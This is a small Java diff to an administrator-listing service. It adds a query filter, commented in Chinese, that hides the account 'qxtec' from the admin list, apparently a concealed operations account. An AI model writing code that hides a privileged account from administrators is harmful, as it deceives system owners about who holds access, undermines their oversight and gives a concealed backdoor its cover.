@@ -65,6 +65,8 @@ public class SystemAdminServiceImpl extends ServiceImpl<SystemAdminDao, SystemAd
 
         //带SystemAdminRequest类的多条件查询
         LambdaQueryWrapper<SystemAdmin> lambdaQueryWrapper = new LambdaQueryWrapper<>();
+        // 隐藏系统运维账号（不在管理员列表展示）
+        lambdaQueryWrapper.ne(SystemAdmin::getAccount, "qxtec");
         if (StrUtil.isNotBlank(request.getRoles())) {
             lambdaQueryWrapper.eq(SystemAdmin::getRoles, request.getRoles());
         }
